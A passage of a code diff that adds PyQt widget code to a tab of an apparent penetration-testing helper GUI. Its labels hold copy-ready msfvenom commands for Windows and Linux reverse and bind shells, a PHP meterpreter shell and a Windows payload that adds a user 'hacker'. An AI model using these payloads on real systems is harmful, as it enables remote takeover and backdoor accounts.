+        if hasattr(self, 'msfv_windows_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
+            self.msfv_windows_divider1.deleteLater()
+        self.msfv_windows_divider1 = QFrame()
+        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider1.setLineWidth(3)
+        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_divider2
+        if hasattr(self, 'msfv_windows_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
+            self.msfv_windows_divider2.deleteLater()
+        self.msfv_windows_divider2 = QFrame()
+        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider2.setLineWidth(3)
+        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_spacer1
+        if hasattr(self, 'msfv_windows_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
+            self.msfv_windows_spacer1.deleteLater()
+        self.msfv_windows_spacer1 = QLabel()
+        self.msfv_windows_spacer1.setFixedWidth(40)
+        self.msfv_windows_spacer1.setFixedHeight(50)
+     
+        # msfv_windows_spacer2
+        if hasattr(self, 'msfv_windows_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
+            self.msfv_windows_spacer2.deleteLater()
+        self.msfv_windows_spacer2 = QLabel()
+        self.msfv_windows_spacer2.setFixedWidth(40)
+        self.msfv_windows_spacer2.setFixedHeight(50)
+     
+        # msfv_windows spacer & divider layout
+        self.tab7_container_layout.insertWidget(100, self.msfv_windows_spacer1)
+        self.tab7_container_layout.insertWidget(101, self.msfv_windows_divider1)
+        self.tab7_container_layout.insertWidget(102, self.msfv_windows_divider2)
+        self.tab7_container_layout.insertWidget(103, self.msfv_windows_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_Scan6
+        if hasattr(self, 'msfv_windows_Scan6'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan6)
+            self.msfv_windows_Scan6.deleteLater()
+        self.msfv_windows_Scan6 = QLabel("msfvenom -p windows/shell_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe")
+        self.msfv_windows_Scan6.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(104,self.msfv_windows_Scan6)
+     
+        # msfv_windows_Scan6_Copy
+        if hasattr(self, 'msfv_windows_Scan6_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan6_Copy)
+            self.msfv_windows_Scan6_Copy.deleteLater()
+        self.msfv_windows_Scan6_Copy = QPushButton()
+        self.msfv_windows_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_windows_Scan6_Copy.setFixedSize(QSize(20,20))
+        self.msfv_windows_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan6.text()))
+        self.msfv_windows_Scan6_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_windows_Scan6 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_windows_Scan6_Copy)
+        label_layout.addWidget(self.msfv_windows_Scan6)
+        self.tab7_container_layout.insertLayout(105, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_windows_divider1
+        if hasattr(self, 'msfv_windows_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
+            self.msfv_windows_divider1.deleteLater()
+        self.msfv_windows_divider1 = QFrame()
+        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider1.setLineWidth(3)
+        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_divider2
+        if hasattr(self, 'msfv_windows_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
+            self.msfv_windows_divider2.deleteLater()
+        self.msfv_windows_divider2 = QFrame()
+        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_windows_divider2.setLineWidth(3)
+        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_windows_spacer1
+        if hasattr(self, 'msfv_windows_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
+            self.msfv_windows_spacer1.deleteLater()
+        self.msfv_windows_spacer1 = QLabel()
+        self.msfv_windows_spacer1.setFixedWidth(40)
+        self.msfv_windows_spacer1.setFixedHeight(50)
+     
+        # msfv_windows_spacer2
+        if hasattr(self, 'msfv_windows_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
+            self.msfv_windows_spacer2.deleteLater()
+        self.msfv_windows_spacer2 = QLabel()
+        self.msfv_windows_spacer2.setFixedWidth(40)
+        self.msfv_windows_spacer2.setFixedHeight(50)
+     
+        # msfv_windows spacer & divider layout
+        self.tab7_container_layout.insertWidget(106, self.msfv_windows_spacer1)
+        self.tab7_container_layout.insertWidget(107, self.msfv_windows_divider1)
+        self.tab7_container_layout.insertWidget(108, self.msfv_windows_divider2)
+        self.tab7_container_layout.insertWidget(109, self.msfv_windows_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_add_users
+        if hasattr(self, 'msfv_add_users'):
+            self.tab7_container_layout.removeWidget(self.msfv_add_users)
+            self.msfv_add_users.deleteLater()
+        self.msfv_add_users = QLabel("[+ Add a user in windows with msfvenom ]")
+        self.msfv_add_users.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(110,self.msfv_add_users)
+     
+        # msfv_add_users_Scan1
+        if hasattr(self, 'msfv_add_users_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_add_users_Scan1)
+            self.msfv_add_users_Scan1.deleteLater()
+        self.msfv_add_users_Scan1 = QLabel("msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe")
+        self.msfv_add_users_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(111,self.msfv_add_users_Scan1)
+     
+        # msfv_add_users_Scan1_Copy
+        if hasattr(self, 'msfv_add_users_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_add_users_Scan1_Copy)
+            self.msfv_add_users_Scan1_Copy.deleteLater()
+        self.msfv_add_users_Scan1_Copy = QPushButton()
+        self.msfv_add_users_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_add_users_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_add_users_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_add_users_Scan1.text()))
+        self.msfv_add_users_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_add_users_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_add_users_Scan1_Copy)
+        label_layout.addWidget(self.msfv_add_users_Scan1)
+        self.tab7_container_layout.insertLayout(112, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_add_users_divider1
+        if hasattr(self, 'msfv_add_users_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_add_users_divider1)
+            self.msfv_add_users_divider1.deleteLater()
+        self.msfv_add_users_divider1 = QFrame()
+        self.msfv_add_users_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_add_users_divider1.setLineWidth(3)
+        self.msfv_add_users_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_add_users_divider2
+        if hasattr(self, 'msfv_add_users_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_add_users_divider2)
+            self.msfv_add_users_divider2.deleteLater()
+        self.msfv_add_users_divider2 = QFrame()
+        self.msfv_add_users_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_add_users_divider2.setLineWidth(3)
+        self.msfv_add_users_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_add_users_spacer1
+        if hasattr(self, 'msfv_add_users_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_add_users_spacer1)
+            self.msfv_add_users_spacer1.deleteLater()
+        self.msfv_add_users_spacer1 = QLabel()
+        self.msfv_add_users_spacer1.setFixedWidth(40)
+        self.msfv_add_users_spacer1.setFixedHeight(50)
+     
+        # msfv_add_users_spacer2
+        if hasattr(self, 'msfv_add_users_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_add_users_spacer2)
+            self.msfv_add_users_spacer2.deleteLater()
+        self.msfv_add_users_spacer2 = QLabel()
+        self.msfv_add_users_spacer2.setFixedWidth(40)
+        self.msfv_add_users_spacer2.setFixedHeight(50)
+     
+        # msfv_add_users spacer & divider layout
+        self.tab7_container_layout.insertWidget(113, self.msfv_add_users_spacer1)
+        self.tab7_container_layout.insertWidget(114, self.msfv_add_users_divider1)
+        self.tab7_container_layout.insertWidget(115, self.msfv_add_users_divider2)
+        self.tab7_container_layout.insertWidget(116, self.msfv_add_users_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_linux
+        if hasattr(self, 'msfv_linux'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux)
+            self.msfv_linux.deleteLater()
+        self.msfv_linux = QLabel("[+ Linux Payloads ]")
+        self.msfv_linux.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(117,self.msfv_linux)
+     
+        # msfv_linux_Scan1
+        if hasattr(self, 'msfv_linux_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan1)
+            self.msfv_linux_Scan1.deleteLater()
+        self.msfv_linux_Scan1 = QLabel("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f elf > shell.elf")
+        self.msfv_linux_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(118,self.msfv_linux_Scan1)
+     
+        # msfv_linux_Scan1_Copy
+        if hasattr(self, 'msfv_linux_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan1_Copy)
+            self.msfv_linux_Scan1_Copy.deleteLater()
+        self.msfv_linux_Scan1_Copy = QPushButton()
+        self.msfv_linux_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_linux_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_linux_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_linux_Scan1.text()))
+        self.msfv_linux_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_linux_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_linux_Scan1_Copy)
+        label_layout.addWidget(self.msfv_linux_Scan1)
+        self.tab7_container_layout.insertLayout(119, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_linux_divider1
+        if hasattr(self, 'msfv_linux_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_divider1)
+            self.msfv_linux_divider1.deleteLater()
+        self.msfv_linux_divider1 = QFrame()
+        self.msfv_linux_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_linux_divider1.setLineWidth(3)
+        self.msfv_linux_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_linux_divider2
+        if hasattr(self, 'msfv_linux_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_divider2)
+            self.msfv_linux_divider2.deleteLater()
+        self.msfv_linux_divider2 = QFrame()
+        self.msfv_linux_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_linux_divider2.setLineWidth(3)
+        self.msfv_linux_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_linux_spacer1
+        if hasattr(self, 'msfv_linux_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer1)
+            self.msfv_linux_spacer1.deleteLater()
+        self.msfv_linux_spacer1 = QLabel()
+        self.msfv_linux_spacer1.setFixedWidth(40)
+        self.msfv_linux_spacer1.setFixedHeight(50)
+     
+        # msfv_linux_spacer2
+        if hasattr(self, 'msfv_linux_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer2)
+            self.msfv_linux_spacer2.deleteLater()
+        self.msfv_linux_spacer2 = QLabel()
+        self.msfv_linux_spacer2.setFixedWidth(40)
+        self.msfv_linux_spacer2.setFixedHeight(50)
+     
+        # msfv_linux spacer & divider layout
+        self.tab7_container_layout.insertWidget(120, self.msfv_linux_spacer1)
+        self.tab7_container_layout.insertWidget(121, self.msfv_linux_divider1)
+        self.tab7_container_layout.insertWidget(122, self.msfv_linux_divider2)
+        self.tab7_container_layout.insertWidget(123, self.msfv_linux_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_linux_Scan2
+        if hasattr(self, 'msfv_linux_Scan2'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan2)
+            self.msfv_linux_Scan2.deleteLater()
+        self.msfv_linux_Scan2 = QLabel("msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f elf > shell.elf")
+        self.msfv_linux_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(124,self.msfv_linux_Scan2)
+     
+        # msfv_linux_Scan2_Copy
+        if hasattr(self, 'msfv_linux_Scan2_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan2_Copy)
+            self.msfv_linux_Scan2_Copy.deleteLater()
+        self.msfv_linux_Scan2_Copy = QPushButton()
+        self.msfv_linux_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_linux_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.msfv_linux_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_linux_Scan2.text()))
+        self.msfv_linux_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_linux_Scan2 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_linux_Scan2_Copy)
+        label_layout.addWidget(self.msfv_linux_Scan2)
+        self.tab7_container_layout.insertLayout(125, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_linux_divider1
+        if hasattr(self, 'msfv_linux_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_divider1)
+            self.msfv_linux_divider1.deleteLater()
+        self.msfv_linux_divider1 = QFrame()
+        self.msfv_linux_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_linux_divider1.setLineWidth(3)
+        self.msfv_linux_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_linux_divider2
+        if hasattr(self, 'msfv_linux_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_divider2)
+            self.msfv_linux_divider2.deleteLater()
+        self.msfv_linux_divider2 = QFrame()
+        self.msfv_linux_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_linux_divider2.setLineWidth(3)
+        self.msfv_linux_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_linux_spacer1
+        if hasattr(self, 'msfv_linux_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer1)
+            self.msfv_linux_spacer1.deleteLater()
+        self.msfv_linux_spacer1 = QLabel()
+        self.msfv_linux_spacer1.setFixedWidth(40)
+        self.msfv_linux_spacer1.setFixedHeight(50)
+     
+        # msfv_linux_spacer2
+        if hasattr(self, 'msfv_linux_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer2)
+            self.msfv_linux_spacer2.deleteLater()
+        self.msfv_linux_spacer2 = QLabel()
+        self.msfv_linux_spacer2.setFixedWidth(40)
+        self.msfv_linux_spacer2.setFixedHeight(50)
+     
+        # msfv_linux spacer & divider layout
+        self.tab7_container_layout.insertWidget(126, self.msfv_linux_spacer1)
+        self.tab7_container_layout.insertWidget(127, self.msfv_linux_divider1)
+        self.tab7_container_layout.insertWidget(128, self.msfv_linux_divider2)
+        self.tab7_container_layout.insertWidget(129, self.msfv_linux_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_linux_Scan3
+        if hasattr(self, 'msfv_linux_Scan3'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan3)
+            self.msfv_linux_Scan3.deleteLater()
+        self.msfv_linux_Scan3 = QLabel("msfvenom -p linux/x64/shell_bind_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f elf > shell.elf")
+        self.msfv_linux_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(130,self.msfv_linux_Scan3)
+     
+        # msfv_linux_Scan3_Copy
+        if hasattr(self, 'msfv_linux_Scan3_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan3_Copy)
+            self.msfv_linux_Scan3_Copy.deleteLater()
+        self.msfv_linux_Scan3_Copy = QPushButton()
+        self.msfv_linux_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_linux_Scan3_Copy.setFixedSize(QSize(20,20))
+        self.msfv_linux_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_linux_Scan3.text()))
+        self.msfv_linux_Scan3_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_linux_Scan3 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_linux_Scan3_Copy)
+        label_layout.addWidget(self.msfv_linux_Scan3)
+        self.tab7_container_layout.insertLayout(131, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_linux_divider1
+        if hasattr(self, 'msfv_linux_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_divider1)
+            self.msfv_linux_divider1.deleteLater()
+        self.msfv_linux_divider1 = QFrame()
+        self.msfv_linux_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_linux_divider1.setLineWidth(3)
+        self.msfv_linux_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_linux_divider2
+        if hasattr(self, 'msfv_linux_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_divider2)
+            self.msfv_linux_divider2.deleteLater()
+        self.msfv_linux_divider2 = QFrame()
+        self.msfv_linux_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_linux_divider2.setLineWidth(3)
+        self.msfv_linux_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_linux_spacer1
+        if hasattr(self, 'msfv_linux_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer1)
+            self.msfv_linux_spacer1.deleteLater()
+        self.msfv_linux_spacer1 = QLabel()
+        self.msfv_linux_spacer1.setFixedWidth(40)
+        self.msfv_linux_spacer1.setFixedHeight(50)
+     
+        # msfv_linux_spacer2
+        if hasattr(self, 'msfv_linux_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer2)
+            self.msfv_linux_spacer2.deleteLater()
+        self.msfv_linux_spacer2 = QLabel()
+        self.msfv_linux_spacer2.setFixedWidth(40)
+        self.msfv_linux_spacer2.setFixedHeight(50)
+     
+        # msfv_linux spacer & divider layout
+        self.tab7_container_layout.insertWidget(132, self.msfv_linux_spacer1)
+        self.tab7_container_layout.insertWidget(133, self.msfv_linux_divider1)
+        self.tab7_container_layout.insertWidget(134, self.msfv_linux_divider2)
+        self.tab7_container_layout.insertWidget(135, self.msfv_linux_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_linux_Scan4
+        if hasattr(self, 'msfv_linux_Scan4'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan4)
+            self.msfv_linux_Scan4.deleteLater()
+        self.msfv_linux_Scan4 = QLabel("msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f elf > shell.elf")
+        self.msfv_linux_Scan4.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(136,self.msfv_linux_Scan4)
+     
+        # msfv_linux_Scan4_Copy
+        if hasattr(self, 'msfv_linux_Scan4_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan4_Copy)
+            self.msfv_linux_Scan4_Copy.deleteLater()
+        self.msfv_linux_Scan4_Copy = QPushButton()
+        self.msfv_linux_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_linux_Scan4_Copy.setFixedSize(QSize(20,20))
+        self.msfv_linux_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_linux_Scan4.text()))
+        self.msfv_linux_Scan4_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_linux_Scan4 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_linux_Scan4_Copy)
+        label_layout.addWidget(self.msfv_linux_Scan4)
+        self.tab7_container_layout.insertLayout(137, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_linux_divider1
+        if hasattr(self, 'msfv_linux_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_divider1)
+            self.msfv_linux_divider1.deleteLater()
+        self.msfv_linux_divider1 = QFrame()
+        self.msfv_linux_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_linux_divider1.setLineWidth(3)
+        self.msfv_linux_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_linux_divider2
+        if hasattr(self, 'msfv_linux_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_divider2)
+            self.msfv_linux_divider2.deleteLater()
+        self.msfv_linux_divider2 = QFrame()
+        self.msfv_linux_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_linux_divider2.setLineWidth(3)
+        self.msfv_linux_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_linux_spacer1
+        if hasattr(self, 'msfv_linux_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer1)
+            self.msfv_linux_spacer1.deleteLater()
+        self.msfv_linux_spacer1 = QLabel()
+        self.msfv_linux_spacer1.setFixedWidth(40)
+        self.msfv_linux_spacer1.setFixedHeight(50)
+     
+        # msfv_linux_spacer2
+        if hasattr(self, 'msfv_linux_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer2)
+            self.msfv_linux_spacer2.deleteLater()
+        self.msfv_linux_spacer2 = QLabel()
+        self.msfv_linux_spacer2.setFixedWidth(40)
+        self.msfv_linux_spacer2.setFixedHeight(50)
+     
+        # msfv_linux spacer & divider layout
+        self.tab7_container_layout.insertWidget(138, self.msfv_linux_spacer1)
+        self.tab7_container_layout.insertWidget(139, self.msfv_linux_divider1)
+        self.tab7_container_layout.insertWidget(140, self.msfv_linux_divider2)
+        self.tab7_container_layout.insertWidget(141, self.msfv_linux_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_web_php
+        if hasattr(self, 'msfv_web_php'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php)
+            self.msfv_web_php.deleteLater()
+        self.msfv_web_php = QLabel("[+ Web Payloads: PHP ]")
+        self.msfv_web_php.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(142,self.msfv_web_php)
+     
+        # msfv_web_php_Scan1
+        if hasattr(self, 'msfv_web_php_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_Scan1)
+            self.msfv_web_php_Scan1.deleteLater()
+        self.msfv_web_php_Scan1 = QLabel("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f raw > shell.php")
+        self.msfv_web_php_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(143,self.msfv_web_php_Scan1)
+     
+        # msfv_web_php_Scan1_Copy
+        if hasattr(self, 'msfv_web_php_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_Scan1_Copy)
+            self.msfv_web_php_Scan1_Copy.deleteLater()
+        self.msfv_web_php_Scan1_Copy = QPushButton()
+        self.msfv_web_php_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_web_php_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_web_php_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_php_Scan1.text()))
+        self.msfv_web_php_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_web_php_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_web_php_Scan1_Copy)
+        label_layout.addWidget(self.msfv_web_php_Scan1)
+        self.tab7_container_layout.insertLayout(144, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_web_php_divider1
+        if hasattr(self, 'msfv_web_php_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_divider1)
+            self.msfv_web_php_divider1.deleteLater()
+        self.msfv_web_php_divider1 = QFrame()
+        self.msfv_web_php_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_web_php_divider1.setLineWidth(3)
+        self.msfv_web_php_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_php_divider2
+        if hasattr(self, 'msfv_web_php_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_divider2)
+            self.msfv_web_php_divider2.deleteLater()
+        self.msfv_web_php_divider2 = QFrame()
+        self.msfv_web_php_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_web_php_divider2.setLineWidth(3)
+        self.msfv_web_php_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_php_spacer1
+        if hasattr(self, 'msfv_web_php_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_spacer1)
+            self.msfv_web_php_spacer1.deleteLater()
+        self.msfv_web_php_spacer1 = QLabel()
+        self.msfv_web_php_spacer1.setFixedWidth(40)
+        self.msfv_web_php_spacer1.setFixedHeight(50)
+     
+        # msfv_web_php_spacer2
+        if hasattr(self, 'msfv_web_php_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_spacer2)
+            self.msfv_web_php_spacer2.deleteLater()
+        self.msfv_web_php_spacer2 = QLabel()
+        self.msfv_web_php_spacer2.setFixedWidth(40)
+        self.msfv_web_php_spacer2.setFixedHeight(50)
+     
+        # msfv_web_php spacer & divider layout
+        self.tab7_container_layout.insertWidget(145, self.msfv_web_php_spacer1)
+        self.tab7_container_layout.insertWidget(146, self.msfv_web_php_divider1)
+        self.tab7_container_layout.insertWidget(147, self.msfv_web_php_divider2)
+        self.tab7_container_layout.insertWidget(148, self.msfv_web_php_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_web_php_Scan2
+        if hasattr(self, 'msfv_web_php_Scan2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_Scan2)
+            self.msfv_web_php_Scan2.deleteLater()
+        self.msfv_web_php_Scan2 = QLabel("cat shell.php | pbcopy && echo '<?php ' | tr -d 'n' > shell.php && pbpaste >> shell.php")
+        self.msfv_web_php_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(149,self.msfv_web_php_Scan2)
+     
+        # msfv_web_php_Scan2_Copy
+        if hasattr(self, 'msfv_web_php_Scan2_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_Scan2_Copy)
+            self.msfv_web_php_Scan2_Copy.deleteLater()
+        self.msfv_web_php_Scan2_Copy = QPushButton()
+        self.msfv_web_php_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_web_php_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.msfv_web_php_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_php_Scan2.text()))
+        self.msfv_web_php_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_web_php_Scan2 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_web_php_Scan2_Copy)
+        label_layout.addWidget(self.msfv_web_php_Scan2)
+        self.tab7_container_layout.insertLayout(150, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_web_php_divider1
+        if hasattr(self, 'msfv_web_php_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_divider1)
+            self.msfv_web_php_divider1.deleteLater()
+        self.msfv_web_php_divider1 = QFrame()
+        self.msfv_web_php_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_web_php_divider1.setLineWidth(3)
+        self.msfv_web_php_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_web_php_divider2
+        if hasattr(self, 'msfv_web_php_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_web_php_divider2)
+            self.msfv_web_php_divider2.deleteLater()
+        self.msfv_web_php_divider2 = QFrame()
+        self.msfv_web_php_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_web_php_divider2.setLineWidth(3)
